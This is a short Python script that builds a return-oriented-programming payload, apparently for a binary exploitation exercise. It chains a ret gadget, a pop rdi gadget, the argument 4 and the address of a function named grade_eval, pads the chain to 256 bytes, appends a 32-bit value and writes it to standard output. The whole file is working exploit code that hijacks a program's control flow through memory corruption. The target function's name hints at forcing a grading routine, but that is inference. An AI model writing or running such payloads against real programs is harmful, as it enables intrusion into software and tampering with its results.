import sys
import struct

def p64(x):
    return struct.pack("<Q", x)

def p32(x):
    return struct.pack("<I", x)

ret = 0x4018a4
pop_rdi = 0x4018a3
grade_eval = 0x401677

rop = p64(ret)
rop += p64(pop_rdi)
rop += p64(4)
rop += p64(grade_eval)

payload = rop.ljust(256, b"A")
payload += p32(168)

sys.stdout.buffer.write(payload + b"\n")
